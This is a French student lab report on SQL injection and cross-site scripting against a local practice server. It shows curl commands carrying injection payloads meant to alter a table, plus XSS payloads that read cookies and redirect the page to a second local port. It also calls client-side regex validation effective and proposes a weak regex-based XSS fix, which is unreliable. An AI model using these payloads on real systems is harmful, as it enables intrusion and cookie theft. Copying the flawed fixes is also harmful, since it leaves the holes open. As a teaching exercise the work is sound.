# Rendu "Injection"

## Binome

Michiels, Pierre, email: pierre.michiels.etu@univ-lille.fr
Saulquin, Clément/Aurélie, email: clement.saulquin.etu@univ-lille.fr


## Question 1

* Quel est ce mécanisme? 
Le mécanisme qui permet d'éviter à l'utilisateur de modifier la table est d'utiliser un script javascript qui vérifie la structure de la chaine de caratères avec une regex.
* Est-il efficace? Pourquoi? 
Ce mécanisme est efficace. En effet à partir du moment où l'on veut exécuter une autre requête SQL à la place de celle prévue, on est obligé de séprarer la requête pirate avec un **;** qui sera automatiquement rejeter par la regex.

## Question 2

* Votre commande curl
Cette commande curl a été obtenue après avoir fait un copier-coller de la commande curl généré par mon navigateur internet (brave) - dans l'onglet réseau.

```
curl 'http://127.0.0.1:8080/' --data-raw 'chaine=$$argent$$&submit=OK' --compressed
```

## Question 3

* Votre commande curl pour effacer la table

```
curl 'http://127.0.0.1:8080/' --data-raw 'chaine=%24%24argent%24%24%27%2C+%27hey%27%29+ # &submit=OK'
ou 
curl 'http://127.0.0.1:8080/' --data-raw "chaine=%24%24argent%24%24', 'hey')#&submit=OK"
```

* Expliquez comment obtenir des informations sur une autre table
Avec mysql, on peut obtenir la liste des tables présentes avec la requête sql suivante:
'show tables;'
Il suffit alors de concatener les 2 requetes mais le problème c'est que le résultat ne pourra s'afficher 
que si le nombre de collonnes du select au dessus de l'input correspondent au nombre de colonnes que la requete show tables donne.

## Question 4

Rendre un fichier server_correct.py avec la correction de la faille de
sécurité. Expliquez comment vous avez corrigé la faille.

J'ai échappé les caractères entrés contenus dans post["chaine"] en string et au paravent les faire passer un test regex similaire qu'à celui présent dans le script js.
Si le test échoue, je renvois une string indiquant une erreur 400. (mauvaise requête)

## Question 5

* Commande curl pour afficher une fenetre de dialog. 
´´´
curl 'http://127.0.0.1:8080/' --data-raw "chaine=%3Cscript%3Ealert%28%22hello%22%29%3C%2Fscript%3E&submit=OK"
´´´

* Commande curl pour lire les cookies
curl 'http://127.0.0.1:8080/' --data-raw "chaine=%3Cscript%3E%0D%0Adocument.cookie+%3D+%22username%3DJohn+Doe%22%3B+%0D%0Aalert%28document.cookie%29%3B%0D%0Adocument.location.replace%28%22http%3A%2F%2F127.0.0.1%3A8090%22%29%3B%0D%0A%3C%2Fscript%3E&submit=OK"


## Question 6

Rendre un fichier server_xss.py avec la correction de la
faille. Expliquez la demarche que vous avez suivi.

La correction du serveur.py pour la faille xss est exactement la même que pour l'injection sql.
On fait d'abord passer l'entrée utilisateur de l'input par un regex. (Ce qui échappe les caractères spéciaux).
un regex spécial pour une faille xss est d'échapper la balise script ainsi: re.search("^<script>", postChaine) et de tester un if contraire ('!')
pour à tout prix éviter d'injecter une balise <script> dans le code.
Puis on exécute la requete sql avec un paramètre de type string sécurisé.


